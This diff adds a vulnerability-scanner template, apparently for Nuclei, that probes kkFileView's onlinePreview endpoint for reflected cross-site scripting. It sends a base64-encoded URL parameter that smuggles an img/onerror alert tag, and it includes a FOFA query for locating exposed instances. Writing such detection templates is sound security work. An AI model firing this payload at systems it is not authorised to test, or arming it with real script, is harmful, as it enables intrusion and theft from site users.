@@ -1,0 +1,30 @@
+id: kkfileview-onlinePreview-url-xss
+info:
+  name: kkfileview onlinePreview url params - xss
+  author: leadlife
+  severity: medium
+  description: 
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="kkFile：View" || app="kkFileView"
+  tags: kkfileview,xss
+
+
+http:
+  - raw:
+      - |
+        GET /onlinePreview?url=aHR0cDovL3d3dy54eHguY29tL3h4eC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEwNzQwMik%2BMTIz HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<img src=111 onerror=alert"
+        condition: and
+
+      - type: status
+        status:
+          - 200
